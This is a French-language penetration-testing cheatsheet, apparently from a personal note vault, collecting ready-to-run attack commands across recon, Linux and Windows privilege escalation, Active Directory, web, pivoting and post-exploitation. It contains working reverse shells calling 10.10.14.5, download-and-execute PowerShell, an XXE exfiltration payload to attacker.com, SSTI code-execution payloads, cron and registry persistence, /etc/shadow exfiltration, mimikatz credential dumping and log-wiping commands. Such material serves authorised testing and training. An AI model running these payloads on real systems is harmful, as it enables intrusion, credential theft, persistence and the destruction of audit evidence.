# ⚡ Cheatsheets

> [!info] **Le mémo de toutes les commandes** — à retrouver vite quand on est en plein pentest.
> Chaque section renvoie vers la note complète.
> 📚 Pour le **détail d'une attaque** (schéma, étapes, détection) : [[Bibliothèque technique|🗂️ Bibliothèque de Techniques]]

---

## 1. Reconnaissance & Scan

Discovery, ports, services, et fingerprinting complet d'une cible.
→ détails : [[01 - Reconnaissance]] | [[02 - Scan & Énumération]] | tool : [[Outil - Nmap]]

```bash
# === DISCOVERY ===
fping -a -g 10.10.10.0/24 2>/dev/null
arp-scan -l
subfinder -d target.com -o subs.txt && httpx -l subs.txt -sc -title -o live.txt
dnsrecon -d target.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brtv
```

```bash
# === PORT SCANNING ===
nmap -sV -sC -oA quick 10.10.10.10
nmap -p- -sV -sC --min-rate 5000 -oA full 10.10.10.10     # tous les ports
nmap -sU --top-ports 20 -sV 10.10.10.10                    # UDP top 20
nmap -A -Pn -p- -T4 10.10.10.10                            # agressif
masscan 10.10.10.0/24 -p0-65535 --rate 10000 -oG masscan.txt
```

```bash
# === SERVICE ENUM ===
# SMB
enum4linux -a 10.10.10.10 && smbclient -L //10.10.10.10/
crackmapexec smb 10.10.10.10 -u '' -p '' --shares
# HTTP
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.10/FUZZ -mc 200,301,302,403
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
nikto -h http://10.10.10.10 && whatweb http://10.10.10.10
# LDAP
ldapsearch -x -H ldap://10.10.10.10 -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
# DNS
dig axfr @10.10.10.10 target.com && dig ANY @10.10.10.10 target.com
# NFS
showmount -e 10.10.10.10 && mount -t nfs 10.10.10.10:/share /mnt/nfs
# SNMP
snmpwalk -c public -v2c 10.10.10.10
snmpwalk -c public -v2c 10.10.10.10 1.3.6.1.4.1.77.1.2.25  # users Windows
# MSSQL / MySQL / RDP
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info 10.10.10.10
nmap -p 3306 --script mysql-info,mysql-enum 10.10.10.10
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 10.10.10.10
```

---

## 2. Shells & Listener

Reverse shells, bind shells, stabilisation PTY, et techniques avancées.
→ détails : [[Techniques\Reverse Shells]] | tool : [[Outil - Netcat]]

```bash
# === LISTENERS ===
nc -lvnp 4444
# Metasploit : use exploit/multi/handler ; set payload <payload> ; set LHOST/LPORT ; run
```

```bash
# === BASH ===
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196
```

```bash
# === PYTHON ===
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```bash
# === PHP ===
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
# === NETCAT (sans -e) ===
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444>/tmp/f
nc -e /bin/sh 10.10.14.5 4444
```

```bash
# === RUBY ===
ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
# === POWERSHELL ===
# Reverse shell complet
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
# Encodé base64
powershell -NoP -NonI -W Hidden -Enc <BASE64>
# Download & Execute
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/p.ps1')
```

```bash
# === SOCAT PTY (meilleure stabilité) ===
# Kali : socat file:`tty`,raw,echo=0 tcp-listen:4444
# Cible : socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

```bash
# === STABILISER ===
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

---

## 3. Privesc Linux

Checklist rapide, GTFOBins, kernel exploits, cron abuse, Docker/LXC escape.
→ détails : [[Techniques\Privilege Escalation Linux]]

```bash
# === ÉNUM RAPIDE ===
id && groups && sudo -l && uname -a
find / -perm -4000 2>/dev/null          # SUID
find / -perm -2000 2>/dev/null          # SGID
find / -writable -type f 2>/dev/null | head -20
cat /etc/crontab && ls -la /etc/cron.*  # Crontabs
getcap -r / 2>/dev/null                 # Capabilities
ss -tlnp                                # Ports en écoute
cat /home/*/.bash_history               # Historique
find / -name "*.conf" -o -name "*.bak" -o -name "*.sql" 2>/dev/null
```

```bash
# === GTFOBins ===
# SUID vim : vim -c ':!sh'
# SUID find : find . -exec /bin/sh -p \; -quit
# SUID python : python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
# SUID nmap (ancien) : nmap --interactive → !sh
# SUID env : env /bin/sh -p
# SUID bash : bash -p
# Cron éditable : echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /path/to/script.sh
```

```bash
# === KERNEL EXPLOITS ===
uname -r && searchsploit linux kernel <version>
# DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), PwnKit (CVE-2021-4034)
```

```bash
# === CRON WILDCARD INJECTION ===
# rsync -a * attacker.com:/share/
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > /tmp/--checkpoint=1
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > /tmp/--checkpoint-action=exec=sh/x.sh
```

```bash
# === DOCKER ESCAPE ===
ls -la /.dockerenv && cat /proc/1/cgroup | grep docker
docker run -v /:/host -it ubuntu chroot /host bash
```

```bash
# === LXC/LXD ESCAPE ===
lxc init ubuntu:latest exploit -c security.privileged=true
lxc config device add exploit host-root disk source=/ path=/mnt/root
lxc start exploit && lxc exec exploit /bin/bash
ls /mnt/root/
```

```bash
# === OUTILS AUTO ===
./linpeas.sh
```

---

## 4. Privesc Windows

Token impersonation, unquoted service path, DLL hijacking, AlwaysInstallElevated.
→ détails : [[Techniques\Privilege Escalation Windows]]

```powershell
# === ÉNUM RAPIDE ===
whoami /all && net user && net localgroup Administrators
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
wmic service list brief && schtasks /query /fo LIST /v | findstr /i "task to run"
```

```powershell
# === TOKEN IMPERSONATION (SeImpersonatePrivilege = Potato) ===
# JuicyPotato, GodPotato, SweetPotato, RoguePotato
GodPotato.exe -cmd "cmd /c whoami"
RoguePotato.exe -r 10.10.14.5 -l 1337 -c "cmd /c whoami"
# SeImpersonatePrivade → NT AUTHORITY\SYSTEM
```

```powershell
# === UNQUOTED SERVICE PATH ===
wmic service list brief | findstr /i "program"
# C:\Program Files\Vulnerable Service\service.exe → tester C:\Program.exe
sc qc "Service Name"
sc config "Service Name" binPath= "C:\temp\shell.exe"
net stop "Service Name" && net start "Service Name"
```

```powershell
# === DLL HIJACKING ===
# Identifier les DLL manquantes avec ProcMon (filter: NAME NOT FOUND)
# Créer la DLL malveillante et la placer dans le répertoire cible
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o hijack.dll
```

```powershell
# === ALWAYSINSTALLELEVATED ===
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Si les deux = 1 :
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

```powershell
# === AUTORUNS ===
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
icacls "C:\path\to\autorun.exe"    # éditable ? → remplacer
```

```powershell
# === SECRETS & CREDENTIALS ===
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
type C:\Windows\Panther\unattend.xml
netsh wlan show profiles && netsh wlan show profile name="SSID" key=clear
cmdkey /list
```

```powershell
# === OUTILS ===
.\winPEASany.exe
.\PowerUp.ps1 ; Invoke-AllChecks
```

---

## 5. Active Directory

Enum complète, Kerberos, délegation, DCSync, relay, Golden/Silver Ticket.
→ détails : [[05 - Active Directory]] | tool : [[Outil - BloodHound]] | [[Outil - Impacket]] | [[Outil - CrackMapExec]] | [[Outil - Mimikatz]]

```bash
# === ÉNUMÉRATION ===
bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.10 -c All --zip
nxc ldap 10.10.10.10 -u user -p 'pass' --users --groups --computers --password-pol
ldapsearch -x -H ldap://10.10.10.10 -D "corp.local\user" -w 'pass' -b "dc=corp,dc=local" "(objectClass=group)" member
dig axfr @10.10.10.10 corp.local
```

```bash
# === KERBEROASTING ===
GetUserSPNs.py -dc-ip 10.10.10.10 'corp.local/user:pass' -request
hashcat -m 13100 kerberoast.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=rockyou.txt --format=krb5tgs kerberoast.txt
```

```bash
# === AS-REP ROASTING ===
GetNPUsers.py -dc-ip 10.10.10.10 -usersfile users.txt 'corp.local/' -outputfile asrep.txt
nldap 10.10.10.10 -u user -p 'pass' --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

```bash
# === SHADOW CREDENTIALS ===
whisker add -c "target$" -d corp.local -u user -p 'pass'
# → .zip avec certificat PFX + password
Rubeus.exe asktgt /user:"target$" /certificate:<BASE64_PFX> /password:<PFX_PASSWORD> /ptt
```

```bash
# === DELEGATION ABUSE ===
# Constrained Delegation → impersonate admin vers service cible
getST.py -spn cifs/target.corp.local -impersonate administrator 'corp.local/svc_sql:pass'
export KRB5CCNAME=administrator@cifs_target.corp.local@CORP.LOCAL
smbclient -k -U administrator //target.corp.local/C$
# RBCD
rbcd.py -delegate-from 'attacker$' -delegate-to 'target$' -dc-ip 10.10.10.10 'corp.local/admin:pass' -action write
getST.py -spn cifs/target.corp.local -impersonate administrator 'corp.local/attacker$:AttackerP@ss'
```

```bash
# === DCSYNC ===
secretsdump.py -just-dc-ntlm 'corp.local/admin:pass@DC01.corp.local'
nxc smb 10.10.10.10 -u admin -p 'pass' --ntds
```

```bash
# === NTLM RELAY ===
ntlmrelayx.py -t 10.10.10.10 -smb2support -e shell.exe
ntlmrelayx.py -t ldap://DC01 --escalate-user attacker
ntlmrelayx.py -t ldap://DC01 --shadow-credentials --shadow-target server$
mitm6 -d corp.local && ntlmrelayx.py -t ldap://DC01 --escalate-user attacker -smb2support
```

```bash
# === PASS-THE-HASH ===
evil-winrm -i 10.10.10.10 -u admin -H <NTHASH>
psexec.py -hashes :<NTHASH> 'corp.local/admin@10.10.10.10'
wmiexec.py -hashes :<NTHASH> 'corp.local/admin@10.10.10.10'
```

```bash
# === GOLDEN / SILVER TICKET ===
mimikatz.exe "kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:<HASH> /ptt"
mimikatz.exe "kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:<HASH> /ptt"
```

```bash
# === GPO ABUSE ===
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vuln GPO"
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl"}
```

```bash
# === PRINTSPOOLER ===
printerbug.py 'corp.local/user:pass'@10.10.10.10 10.10.14.5
ntlmrelayx.py -t ldap://DC01 --escalate-user attacker -smb2support
```

---

## 6. Web

SQLmap avancé, SSRF, XXE, SSTI, file upload, JWT, OAuth.
→ détails : [[03 - Exploitation Web]] | tool : [[Outil - sqlmap]] | [[Outil - ffuf]] | [[Outil - nuclei]] | [[Outil - Burp Suite]]

```bash
# === SQLMAP ===
sqlmap -u "http://target/page?id=1" --dbs --batch
sqlmap -u "http://target/page?id=1" -D db -T users --dump --batch
sqlmap -u "http://target/login" --data="user=admin&pass=123" -p user --batch
sqlmap -u "http://target/page?id=1" --cookie="session=abc" --batch
sqlmap -r request.txt --file-read="/etc/passwd" --batch
sqlmap -r request.txt --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
sqlmap -u "http://target/page?id=1" --technique=BEU --time-sec=5 --batch
sqlmap -u "http://target/page?id=1" --os-shell --batch
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --random-agent --batch
```

```bash
# === SSRF ===
curl "http://target/api?url=http://127.0.0.1/admin"
# Protocoles : file:///etc/passwd, gopher://127.0.0.1:25/
# Bypass IP : http://0x7f000001/, http://2130706433/, http://127.1/, http://127.0.0.1.nip.io/
# AWS : http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

```bash
# === XXE ===
cat << 'EOF' > xxe.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF
curl -X POST http://target/api/xml -d @xxe.xml -H "Content-Type: application/xml"
# Blind XXE : héberger un .dtd sur votre serveur
# evil.dtd : <!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">%param;%exfil;
```

```bash
# === SSTI ===
# Détection : {{7*7}} = 49, ${7*7} = 49, <%= 7*7 %> = 49
# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

```bash
# === FILE UPLOAD BYPASS ===
# Extensions : .php3 .php4 .php5 .phtml .pht .phar
# Double ext : shell.php.jpg | Content-Type: image/png
# .htaccess : AddType application/x-httpd-php .png → uploader shell.png
```

```bash
# === JWT ATTACKS ===
echo "eyJhb..." | base64 -d
# alg:none : modifier header → {"alg":"none","typ":"JWT"} → supprimer signature
hashcat -m 16500 jwt.txt rockyou.txt
```

```bash
# === NUCLEI ===
nuclei -u http://target -t cves/
nuclei -l urls.txt -t technologies/ -severity critical,high
nuclei -u http://target -t http/vulnerabilities/ -tags sqli,xss,ssrf
```

---

## 7. Cracking

Identification de hash, dictionnaire, brute-force, et rainbow.
→ détails : [[08 - Password Cracking]] | tool : [[Outil - hashcat]] | [[Outil - John the Ripper]]

```bash
# === IDENTIFICATION ===
hashid 'hash' && hash-identifier && name-that-hash -t 'hash'
```

```bash
# === TABLEAUX HASHCAT ===
# 0=MD5 | 100=SHA1 | 1000=NTLM | 18200=AS-REP | 13100=Kerberoast
# 5600=NetNTLMv2 | 22000=WPA | 3200=bcrypt | 1800=sha512crypt
# 16800=WPA-PMKID | 22911=SSH key | 24420=PKCS12/PFX
```

```bash
# === HASHCAT AVANCÉ ===
hashcat -m 1000 hash.txt rockyou.txt
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 3 hash.txt '?u?l?l?l?l?l?d?d?d?d'   # brute-force
hashcat -m 1000 -a 1 hash.txt wordlist1.txt wordlist2.txt   # combinator
hashcat -m 1000 -a 3 -i --increment-min=4 --increment-max=8 hash.txt '?a?a?a?a?a?a?a?a'
hashcat --session=crack1 --restore   # reprise session
```

```bash
# === JOHN ===
john --wordlist=rockyou.txt --format=netntlmv2 hash.txt
john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt
john --show hash.txt && john --list=formats
```

```bash
# === NTLM / NETNTLMV2 ===
hashcat -m 1000 ntlm_hash.txt rockyou.txt
hashcat -m 5600 netntlmv2.txt rockyou.txt
```

```bash
# === KERBEROS ===
hashcat -m 13100 kerberoast.txt rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

```bash
# === WPA ===
hashcat -m 22000 hc22000.hcpxxl rockyou.txt
aircrack-ng -w rockyou.txt -b <BSSID> capture.cap
```

```bash
# === SSH KEY ===
ssh2john id_rsa > ssh_hash.txt
john --wordlist=rockyou.txt ssh_hash.txt
```

---

## 8. Pivoting & Tunnels

Forwarding, SOCKS proxy, pivots réseau, et accès aux sous-réseaux cachés.
→ détails : [[Techniques\Pivoting et Tunneling]] | tool : [[Outil - Chisel]] | [[Outil - Ligolo-ng]]

```bash
# === SSH PORT FORWARDING ===
ssh -L 8080:127.0.0.1:8080 user@10.10.10.10      # local forward
ssh -R 4444:127.0.0.1:4444 user@attacker.com      # remote forward
ssh -D 1080 user@10.10.10.10                       # dynamic SOCKS proxy
proxychains nmap -sT -Pn -p 22,80,443 192.168.1.0/24
```

```bash
# === SSHUTTLE (VPN over SSH) ===
sshuttle -r user@10.10.10.10 192.168.1.0/24
sshuttle -r user@10.10.10.10 10.0.0.0/8 --dns
```

```bash
# === CHISEL ===
# Kali : ./chisel server --reverse --port 8080 --socks5
# Cible : ./chisel client 10.10.14.5:8080 R:socks
# Forward port spécifique :
# Cible : ./chisel client 10.10.14.5:8080 R:3389:127.0.0.1:3389
```

```bash
# === LIGOLO-NG ===
# Kali : sudo ip tuntap add user root mode tun ligolo && sudo ip link set ligolo up
#        ./proxy -selfcert -laddr 0.0.0.0:11601
# Cible : ./agent -connect 10.10.14.5:11601 -ignore-cert
# Kali : sudo ip route add 192.168.1.0/24 dev ligolo
```

```bash
# === SOCAT ===
socat TCP-LISTEN:4444,fork TCP:192.168.1.50:3389
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

```bash
# === METASPLOIT ===
run autoroute -s 192.168.1.0/24
use auxiliary/server/socks_proxy ; set SRVPORT 1080 ; run -j
```

```bash
# === WINDOWS (netsh) ===
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.50
```

---

## 9. Payloads msfvenom

Staged/stageless, shellcode, encoders, et formats courants.
→ tool : [[Outil - Metasploit]]

```bash
# === LINUX ===
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```

```bash
# === WINDOWS ===
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe -e x64/xor_dynamic -i 5
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o shell.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o shell.msi
```

```bash
# === WEB ===
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
```

```bash
# === SHELLCODE ===
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f python
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c
```

```bash
# === FORMATS / ENCODEURS ===
msfvenom --list formats       # elf exe dll msi asp jsp war raw c python psh vba hta-psh
msfvenom --list encoders      # x64/xor_dynamic, x86/shikata_ga_nai, x86/alpha_mixed
# NOTE : l'encodage ne BYPASSE PAS un bon AV
```

---

## 10. Post-Exploitation

Dump hashes, mouvement latéral, persistence, exfiltration, nettoyage de logs.
→ détails : [[06 - Post-Exploitation]] | tool : [[Outil - Mimikatz]] | [[Outil - CrackMapExec]] | [[Outil - Evil-WinRM]]

```bash
# === DUMP HASHES (Linux) ===
cat /etc/shadow && unshadow /etc/passwd /etc/shadow > hashes.txt
```

```powershell
# === DUMP HASHES (Windows) ===
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
mimikatz.exe "privilege::debug" "lsadump::sam" exit
reg save HKLM\SAM C:\temp\SAM && reg save HKLM\SYSTEM C:\temp\SYSTEM
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

```bash
# === LATERAL MOVEMENT ===
evil-winrm -i 10.10.10.20 -u admin -H <NTHASH>
psexec.py -hashes :<NTHASH> 'corp.local/admin@10.10.10.20'
wmiexec.py -hashes :<NTHASH> 'corp.local/admin@10.10.10.20'
nxc smb 10.10.10.0/24 -u users.txt -p 'Password1!' --continue-on-success --share C$
```

```powershell
# === PERSISTENCE WINDOWS ===
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')" /sc ONLOGON /ru SYSTEM
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "powershell -ep bypass -c ..." /f
sc create Updater binPath= "C:\temp\shell.exe" start= auto
```

```bash
# === PERSISTENCE LINUX ===
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" | crontab -
mkdir -p ~/.ssh && echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &' >> ~/.bashrc
```

```bash
# === EXFILTRATION ===
base64 /etc/shadow | nc 10.10.14.5 4445
python3 -m http.server 8080
curl -X POST http://10.10.14.5:8080/upload -F "file=@/etc/shadow"
```

```bash
# === NETTOYAGE ===
# Linux
cat /dev/null > /var/log/auth.log && cat /dev/null > /var/log/syslog && history -c && rm /root/.bash_history
# Windows
wevtutil cl Security && wevtutil cl System && wevtutil cl Application
```

---

## 11. Network Attacks

LLMNR/NBT-NS poisoning, mitm6, ntlmrelayx, Responder, ARP spoofing.
→ détails : [[04 - Exploitation Réseau]] | tool : [[Outil - Responder]] | [[Outil - mitm6]] | [[Outil - bettercap]]

```bash
# === RESPONDER ===
responder -I eth0 -wrf
# -w=WPAD, -r=NetBIOS, -f=Fingerprint, -d=DHCP
# → Captures NTLMv2 → hashcat -m 5600
```

```bash
# === MITM6 (DHCPv6 + DNS poisoning) ===
mitm6 -d corp.local
ntlmrelayx.py -t ldap://DC01.corp.local --escalate-user attacker -smb2support
```

```bash
# === NTLMRELAYX ===
ntlmrelayx.py -t 10.10.10.20 -smb2support -e shell.exe        # SMB
ntlmrelayx.py -t ldap://DC01 --escalate-user attacker          # LDAP
ntlmrelayx.py -t ldap://DC01 --shadow-credentials --shadow-target server$
ntlmrelayx.py -t mssql://10.10.10.30 -q "EXEC xp_cmdshell 'whoami'"  # MSSQL
ntlmrelayx.py -tf targets.txt -smb2support -e shell.exe       # multi-target
```

```bash
# === ARP SPOOFING ===
sudo bettercap -iface eth0
set arp.spoof.targets 10.10.10.20
arp.spoof on && net.sniff on
# DNS spoofing
set dns.spoof.domains *.target.com && set dns.spoof.address 10.10.14.5 && dns.spoof on
```

```bash
# === BETTERCAP (complet) ===
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 10.10.10.20 10.10.10.1
arpspoof -i eth0 -t 10.10.10.1 10.10.10.20
```

---

## 12. Password Spraying & Brute-Force

Attaques à grande échelle, awareness lockout, et outils automatisés.
→ détails : [[Techniques\Password Spraying]] | tool : [[Outil - Hydra]] | [[Outil - CrackMapExec]]

```bash
# === CRACKMAPEXEC ===
nxc smb 10.10.10.0/24 -u users.txt -p 'Password1!' --continue-on-success
nxc ldap 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success
nxc winrm 10.10.10.0/24 -u users.txt -p 'P@ssw0rd' --continue-on-success
nxc ssh 10.10.10.0/24 -u users.txt -p 'P@ssw0rd' --continue-on-success
nxc ldap 10.10.10.10 -u user -p 'pass' --password-pol     # vérifier lockout policy
```

```bash
# === HYDRA ===
hydra -l admin -P rockyou.txt ssh://10.10.10.10 -t 4
hydra -l admin -P rockyou.txt ftp://10.10.10.10 -t 4
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
hydra -l administrator -P rockyou.txt rdp://10.10.10.10 -t 1
```

```bash
# === MEDUSA ===
medusa -h 10.10.10.10 -u admin -P rockyou.txt -M ssh
medusa -h 10.10.10.10 -u users.txt -P passwords.txt -M smbnt -T 10
```

```bash
# === NCRACK ===
ncrack -p ssh --user admin -P rockyou.txt 10.10.10.10
ncrack -p rdp --user administrator -P rockyou.txt 10.10.10.10
```

```bash
# === PATATOR ===
patator ssh_login host=10.10.10.10 user=admin password=FILE0 0=rockyou.txt -x ignore:fgrep='incorrect'
```

```bash
# === LOCKOUT AWARENESS ===
# Windows défaut : lockout après 5 tentatives (ou 0 = infini)
# Stratégie : 1 mdp toutes les 30 min OU 1 mdp sur 1000 users
net accounts  # vérifier le lockout threshold
nxc ldap 10.10.10.10 -u user -p 'pass' --password-pol
```

---

## 13. Wireless

Aircrack-ng, WPA/WPA2, handshake capture, Evil Twin.
→ détails : [[07 - Wireless, MITM & Social Engineering]] | tool : [[Outil - aircrack-ng]] | [[Outil - Wifite]]

```bash
# === WORKFLOW WPA2 ===
# 1. Mode monitor
airmon-ng check kill && airmon-ng start wlan0
# 2. Scan
airodump-ng wlan0mon
# 3. Capturer handshake sur un BSSID
airodump-ng -c <canal> --bssid <BSSID> -w capture wlan0mon
# 4. Deauth pour forcer la reconnexion
aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon
# 5. Crack
aircrack-ng -w rockyou.txt -b <BSSID> capture-01.cap
hcxpcapngtool -o hash.22000 capture-01.cap && hashcat -m 22000 hash.22000 rockyou.txt
# PMKID direct (sans handshake)
hcxpcapngtool --pmkid -o pmkid.22000 capture.cap && hashcat -m 22000 pmkid.22000 rockyou.txt
```

```bash
# === EVIL TWIN ===
# hostapd-mana
cat << 'EOF' > hostapd-mana.conf
interface=wlan1
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g
EOF
hostapd-mana hostapd-mana.conf
```

```bash
# === WIFITE (automatisé) ===
wifite --wpa --dict rockyou.txt
wifite --bssid AA:BB:CC:DD:EE:FF --wpa
```

---

## 14. RFID & NFC

Proxmark3, Flipper Zero, MIFARE, HID cloning.
→ détails : [[13 - Hardware & IoT]] | [[Techniques\Hardware - RFID et NFC]] | [[Techniques\Hardware - RFID LF (HID, EM410X, Indala, HiTag)]] | [[Techniques\Hardware - RFID MIFARE (HF 13.56 MHz)]]

```bash
# === PROXMARK3 — LF (125 kHz) ===
lf search                          # détecter badge LF
lf em 4x read                      # EM4100
lf hid read                        # HID Prox
lf hid clone -r <RAW_DATA>         # cloner HID
lf t55xx write -b 0 -d <DATA>      # écrire sur T5577
```

```bash
# === PROXMARK3 — HF (13.56 MHz) ===
hf search                          # détecter badge HF
hf mf dump                         # MIFARE Classic → dump
hf mf darkside                     # crack clés (darkside attack)
hf mf nested                       # crack clés (nested attack)
hf mf hardnested --blk 0 --key A <KEY>
hf mf restore -f dump.mfd          # restaurer dump sur carte
hf 14a info                        # info carte 14a
```

```bash
# === FLIPPER ZERO ===
# Menu > NFC > Read → Emulate
# Menu > Sub-GHz > Read → Replay
# BadUSB : injecter des commandes clavier via USB
```

---

## 15. Reverse Engineering

Ghidra, radare2, gdb-peda, Frida, strace/ltrace, binwalk.
→ détails : [[09 - Reverse Engineering & Malware]] | tool : [[Outil - Ghidra]] | [[Outil - gdb-peda]] | [[Outil - Frida]]

```bash
# === FILE ANALYSIS ===
file binary && strings binary | head -50
binwalk -e binary && xxd binary | head -20
readelf -a binary && objdump -d binary
ltrace ./binary && strace ./binary
```

```bash
# === GDB + PEDA ===
gdb ./binary
b main / b *0x4011a0    # breakpoints
r [args]                 # run
ni / si                  # step over / step in
x/20wx $rsp              # stack
info registers && p $rax
set $rax = 1             # modifier registre
```

```bash
# === RADARE2 ===
r2 -A ./binary
aaa                      # full analysis
afl                      # list functions
pdf @main                # disassemble
iz                       # strings
axt @sym.check           # cross-references
```

```bash
# === FRIDA (instrumentation dynamique) ===
frida -U -f com.target.app -l hook.js
# hook.js : Java.perform(function() { var check = Java.use("com.target.app.Check"); check.verify.implementation = function(input) { console.log("Input: " + input); return true; }; });
frida-ps -U              # lister processus
```

```bash
# === JADX / APKTOOL ===
jadx -d output/ app.apk
apktool d app.apk
```

---

## 16. Forensics & Logs

Volatility 3, YARA, log analysis, PCAP.
